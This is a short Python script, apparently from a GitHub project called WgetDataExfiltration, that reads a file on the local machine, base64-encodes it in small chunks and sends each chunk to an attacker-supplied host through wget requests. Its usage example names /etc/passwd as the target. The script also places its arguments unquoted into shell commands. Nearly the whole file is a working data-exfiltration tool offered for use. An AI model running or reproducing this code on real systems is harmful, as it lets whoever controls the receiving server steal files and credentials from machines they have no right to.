import sys
import os
import subprocess
import base64


def read_sendFile(host, file_name):
	# File output stream.
	file_stream = subprocess.check_output(f'/bin/cat {file_name}',shell=True).decode('utf-8')

	# File counter size.
	file_size = len(file_stream)

	# Loop to iterate in file_stream and send each piece to the server while the counter is small than the original
	# file characters size.
	counter,before = 0,0
	while(counter <= file_size+24):
		# Get the chunk and convert to base64
		converted_line = str(base64.b64encode(bytes(file_stream[before:counter], 'utf-8')).decode('utf-8'))
		# Send chunk to the host.
		os.system(f'wget -qO- \"{host}/{converted_line}\" -O /dev/null')
		before = counter
		counter += 24
		
	
if __name__ == '__main__':
	banner = """
=========================================================
*	WgetDumper Server				*
*	Coded by: SidHawks				*
*							*
*  https://github.com/sidhawkss/WgetDataExfiltration	*
=========================================================
	"""
	# Running read_file function and print banners and informations.
	try:
		read_sendFile(str(sys.argv[1]), str(sys.argv[2]))
		print(banner)
		print("[*]Sending to the server...")
	except:
		print(banner)
		print("[!]Error on loading the function...\n   You need to provide 2 arguments, the IP of the server and the name of the file.")
		print("   Example: $ python WgetSender.py 192.168.1.13 \"/etc/passwd\"")
		sys.exit(2)
